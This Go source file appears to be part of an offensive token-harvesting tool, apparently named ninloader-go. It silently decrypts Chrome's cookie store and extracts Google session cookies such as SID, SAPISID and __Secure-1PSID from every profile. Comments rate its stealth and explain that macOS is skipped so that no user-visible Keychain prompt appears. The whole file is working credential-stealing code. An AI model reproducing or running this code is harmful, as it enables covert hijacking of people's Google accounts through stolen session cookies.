//go:build !darwin

// Google browser cookie collector — extracts session cookies via Chromium decrypt.
//
// Extracts Google session cookies (SID, HSID, SSID, APISID, SAPISID, etc.)
// from Chrome's encrypted Cookies database using the chromium package.
//
// Cross-platform support:
//   - macOS:   SKIPPED (build tag excludes — Keychain prompt is user-visible)
//   - Windows: DPAPI via CryptUnprotectData (silent)
//   - Linux:   PBKDF2 with 'peanuts' hardcoded key
//
// OPSEC:
//   - Windows/Linux: SILENT (DPAPI / hardcoded 'peanuts' key)
//   - macOS: SKIPPED by default (Keychain prompt is user-visible)
package google

import (
	"fmt"
	"sort"
	"strings"

	"github.com/ninken/ninloader-go/internal/chromium"
	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

// Google session cookie names used for authenticated API access.
var googleHostPatterns = []string{".google.com", "accounts.google.com"}

var googleCookieNames = map[string]struct{}{
	"SID":             {},
	"HSID":            {},
	"SSID":            {},
	"APISID":          {},
	"SAPISID":         {},
	"__Secure-1PSID":  {},
	"__Secure-3PSID":  {},
}

func init() {
	registry.Register("google", "browser_cookies", func() collector.Collector {
		return &BrowserCookiesCollector{
			BaseCollector: collector.BaseCollector{Svc: "google", Src: "browser_cookies"},
		}
	})
}

// BrowserCookiesCollector extracts Google session cookies from Chrome's
// encrypted Cookies database via the chromium package.
type BrowserCookiesCollector struct {
	collector.BaseCollector
}

func (c *BrowserCookiesCollector) Service() string          { return c.Svc }
func (c *BrowserCookiesCollector) Source() string            { return c.Src }
func (c *BrowserCookiesCollector) StealthScore() int         { return 5 }
func (c *BrowserCookiesCollector) Platforms() []string       { return []string{"linux", "windows"} }
func (c *BrowserCookiesCollector) IsPlatformSupported() bool { return true }

// profiles returns the list of Chrome profile directory names to scan.
func profiles() []string {
	p := []string{"Default"}
	for i := 1; i <= 9; i++ {
		p = append(p, fmt.Sprintf("Profile %d", i))
	}
	return p
}

func (c *BrowserCookiesCollector) Discover() []*types.DiscoveredToken {
	var results []*types.DiscoveredToken
	chromeDir := platform.ChromeUserDataDir()

	for _, profile := range profiles() {
		// ExtractCookies handles both Cookies and Network/Cookies paths,
		// so we just check if the profile directory looks viable by
		// checking the chromium.ListProfiles result. For discovery we
		// use the same heuristic: attempt extraction (cheap file check).
		cookies, err := chromium.ExtractCookies(chromeDir, profile, googleHostPatterns, nil)
		if err != nil || len(cookies) == 0 {
			continue
		}

		cookieNamesSorted := sortedGoogleCookieNames()
		results = append(results, &types.DiscoveredToken{
			Service:      c.Svc,
			Source:       c.Src,
			Path:         fmt.Sprintf("%s/%s/Cookies", chromeDir, profile),
			AccountHint:  fmt.Sprintf("chrome:%s", profile),
			StealthScore: c.StealthScore(),
			Details: fmt.Sprintf(
				"Google session cookies (%s); platform=%s",
				strings.Join(cookieNamesSorted, ", "),
				platform.Platform(),
			),
		})
	}

	return results
}

func (c *BrowserCookiesCollector) Collect() []*types.CollectedToken {
	chromeDir := platform.ChromeUserDataDir()

	var results []*types.CollectedToken

	for _, profile := range profiles() {
		cookies, err := chromium.ExtractCookies(chromeDir, profile, googleHostPatterns, nil)
		if err != nil {
			c.Warn(fmt.Sprintf("Failed to extract cookies from %s: %v", profile, err))
			continue
		}

		// Filter to only the session cookies we care about.
		sessionCookies := make(map[string]chromium.Cookie)
		for _, ck := range cookies {
			if _, ok := googleCookieNames[ck.Name]; ok {
				sessionCookies[ck.Name] = ck
			}
		}

		if len(sessionCookies) == 0 {
			continue
		}

		// Pick the most useful cookie as primary token.
		var primaryName string
		for _, candidate := range []string{"SAPISID", "SID", "__Secure-1PSID"} {
			if _, ok := sessionCookies[candidate]; ok {
				primaryName = candidate
				break
			}
		}
		if primaryName == "" {
			// Use first available.
			for name := range sessionCookies {
				primaryName = name
				break
			}
		}

		primaryCookie := sessionCookies[primaryName]

		// Build cookie data for extra field.
		cookieData := make(map[string]any)
		for name, ck := range sessionCookies {
			cookieData[name] = map[string]any{
				"value":    ck.Value,
				"host":     ck.Host,
				"path":     ck.Path,
				"secure":   ck.Secure,
				"httponly":  ck.HTTPOnly,
			}
		}

		tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
		tok.AccessToken = types.Secure(primaryCookie.Value)
		tok.Extra["profile"] = profile
		tok.Extra["primary_cookie"] = primaryName
		tok.Extra["cookies"] = cookieData
		tok.Extra["cookie_count"] = len(sessionCookies)
		tok.Extra["platform"] = platform.Platform()

		results = append(results, tok)

		names := make([]string, 0, len(sessionCookies))
		for n := range sessionCookies {
			names = append(names, n)
		}
		sort.Strings(names)
		c.Info(fmt.Sprintf(
			"Extracted %d Google cookies from chrome:%s (%s)",
			len(sessionCookies), profile, strings.Join(names, ", "),
		))
	}

	return results
}

func sortedGoogleCookieNames() []string {
	names := make([]string, 0, len(googleCookieNames))
	for n := range googleCookieNames {
		names = append(names, n)
	}
	sort.Strings(names)
	return names
}
